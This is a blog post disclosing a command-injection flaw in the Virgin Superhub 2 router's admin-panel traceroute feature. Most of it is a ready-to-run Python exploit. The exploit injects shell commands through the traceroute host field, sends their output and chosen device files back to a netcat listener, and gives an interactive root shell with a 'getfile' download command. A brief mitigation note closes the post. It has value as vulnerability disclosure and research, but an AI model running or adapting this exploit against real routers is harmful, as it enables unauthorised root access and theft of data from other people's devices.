---
layout: post
title: Virgin Superhub 2 Remote Command Execution as Root
tag: 
---

I recently read the writeup on the [Virgin Superhub 7 second bootup flaw ](http://ramblingrant.co.uk/2014/03/06/virgin-media-superhub-7-second-security-flaw), this motivated me to post a remote command execution vulnerability that I found a while back.

The vulnerability occurs in the traceroute feature in the admin panel. It executes the shell command traceroute, where the user controls IP address, so the attacker can escape the shell command and execute any command they want – as root, no privilege escalation necessary. For example we control the host variable in the pseudo code for the traceroute function below.

# Pseudo Code

`exec("traceroute " + host + " " + arguments)`

To make it easier exploiting this I have written a shell script that emulates a terminal by sending the results of the commands to a listener using netcat.	


```
import requests
import socket
import re
import json
ip = ‘192.168.0.8’
port = 9991
file_port = 9992
size = 1024
host = ”
backlog = 5

def getToken():
regex = ‘<input type="hidden" name="(.*)" value’
content = requests.get(‘http://192.168.0.1/VmRgTraceRoute.html’).text
token = re.findall(regex,content)
return token[4]

def postRequest(token, cmd):
data = {"VmCheckRun": 0, "VmCheckContent":1,"VmTraceRouteHost": cmd, "VmTraceRouteToolCommand": 1, "VmTraceRouteStats": "pwned", token : 0}
r = requests.post("http://192.168.0.1/cgi-bin/TraceRouteCgi",data=data)

def processCMD(cmd):
token = getToken()
cmd = ";export test1=`" + cmd + "`; echo $test1 | nc " + ip + " " + str(port) + " ; echo lol"
postRequest(token,cmd)

def getFile(filename):
finished =0
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,file_port))
s.listen(backlog)
cmd = ";nc " + ip + " " + str(file_port) + " < " + filename + "; echo"
token = getToken()
postRequest(token,cmd)
while finished ==0:
client, address = s.accept()
data = client.recv(500000)
if data:
print data
client.close()
s.shutdown(socket.SHUT_WR)
s.close()
finished = 1

def listenSocket():
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))
s.listen(backlog)
while 1:
cmd = raw_input("> ")
if "getfile" in cmd:
print cmd.split(" ")[1]
getFile(cmd.split(" ")[1])
else:
processCMD(cmd)
client, address = s.accept()
data = client.recv(size)

if data:
print data
client.close()

listenSocket()
```

# Usage

 Ensure you are logged into the device admin panel. Edit the python script and replace the IP and port with your local IP and port, this must be allowed through your firewall because you need to listen to read the result of your commands.

```
python routerexploit.py

ls # type any command to execute shell command on device

getfile /etc/hosts # type "getfile" to download file from device
```

# Mitigation

Simply change the admin panel password, an attacker needs to be authenticated to exploit this bug.

# Future Work

 Using this exploit you can pull the custom binaries off the device and look for more bugs and backdoors. You could also use this to attempt to port custom firmware such as dd-wrt to this device.